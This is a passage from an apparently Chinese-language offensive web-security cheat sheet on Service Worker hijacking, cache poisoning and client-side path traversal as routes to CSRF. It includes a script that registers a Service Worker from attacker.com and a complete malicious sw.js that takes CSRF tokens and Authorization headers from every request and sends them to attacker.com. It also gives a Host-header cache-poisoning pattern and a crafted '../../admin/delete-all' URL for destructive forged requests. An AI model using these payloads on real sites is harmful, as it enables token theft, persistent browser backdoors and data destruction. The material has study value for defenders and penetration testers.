## 十一、Service Worker劫持与缓存投毒CSRF

### 11.1 Service Worker绕过SameSite（浏览器缺陷面）
```
情报（Chromium issue 429585229 / 470574526，2025）：
1. 目标注册了Service Worker时，SW拦截请求并fetch()转发，SameSite=Strict/Lax Cookie
   可能被不当包含在跨站请求中（Chromium被报为Won't Fix/未复现，但Firefox/特定路径下仍值得实测）
2. 任何使用SW且依赖SameSite做CSRF防护的站点存在被绕过风险
3. SW自身"什么都不做"只需注册在目标域即可构成攻击面（470574526场景：
   DevTools打开后重发请求时Strict Cookie被携带）

实战思路：
- 检测目标是否注册SW（/sw.js、navigator.serviceWorker）
- 若目标同时依赖SameSite且SW代码会把请求转发给fetch → 构造跨站提交并验证Cookie是否携带
- 若攻击者能注册/控制SW（见11.2）→ 直接同源执行任意JS → 完全控制
```

### 11.2 Service Worker劫持（注册恶意SW）
```
前提：目标存在任意XSS、或JSONP允许跨域注册SW、或Service-Worker-Allowed头放宽scope
1. 在受害者浏览器注册攻击者SW：
   <script>
   navigator.serviceWorker.register('https://attacker.com/sw.js', {scope:'/'});
   </script>
   // 跨域注册需SW脚本支持CORS（ACAO:*）+ MIME text/javascript
2. 恶意sw.js：拦截所有请求，窃取Authorization/X-CSRF-Token头与响应，或修改响应注入恶意脚本
3. scope扩大：目标响应含 Service-Worker-Allowed: / 时，/blog下的XSS可注册根scope SW
4. 持久性：SW生命周期长于单次会话，可作为持久后门（配合Token窃取→任意CSRF/XSS）

恶意SW示例（Token窃取）：
// sw.js
self.addEventListener('fetch', function(event) {
  var token = event.request.headers.get('X-CSRF-Token') ||
              event.request.headers.get('Authorization');
  if (token) { fetch('https://attacker.com/collect?t=' + btoa(token)); }
  event.respondWith(fetch(event.request));
});
```

### 11.3 缓存投毒（Cache Poisoning）→ CSRF
```
1. 投毒同源缓存（CDN/浏览器HTTP缓存），使受害者访问 target.com 时加载被投毒页面/JS
2. 投毒JS中植入"页面加载即向敏感接口发同源请求"逻辑：
   同源请求自动携带全部Cookie + 可从页面DOM读取Token → 等价于同源XSS执行
3. 变体：投毒登录后页面（含CSRF Token的页面）→ 读取被投毒响应中的Token
4. 利用条件：缓存键未包含关键请求头（X-Forwarded-Host/Host/自定义头反射）
   GET /js/app.js
   Host: target.com                    → 命中缓存键？若Host未入键：
   Host: attacker.com → 响应中的URL/脚本引用被替换为attacker.com → 缓存污染
5. 与CSRF组合：Cache poisoning + CSRF = "受害者无需点击，访问首页即中招"
```

### 11.4 CSPT2CSRF（客户端路径穿越→CSRF，Doyensec 2025研究）
```
概念：前端从URL参数/DOM读取用户可控值拼接API路径（Client-Side Path Traversal），
攻击者控制该输入使"合法API请求"被重路由到敏感端点。由于请求由前端同源发起，
自动携带Cookie且自带Token → 所有CSRF防护全部失效

示例（笔记应用）：
// 前端代码（有CSPT缺陷）：
// const id = new URLSearchParams(location.search).get('id');
// fetch(`/api/notes/${id}`, {method:'POST', body: draft})

// 攻击者构造：
https://target.com/editor?id=../../admin/delete-all
// → 前端请求 POST /api/notes/../../admin/delete-all → 规范化后 /api/admin/delete-all
// 请求由target.com同源前端发起 → Cookie+Token完备 → 删除所有笔记

检测：
1. 在前端JS中找 fetch/XHR/axios 等API调用，追踪URL是否拼接用户可控输入（location.hash/search、postMessage、DOM值）
2. 拼接点是否可注入 ../ 或 / 改变路径
3. 是否存在高价值sink（删除/转账/改密/权限）
4. 官方提供Burp扩展辅助扫描
```

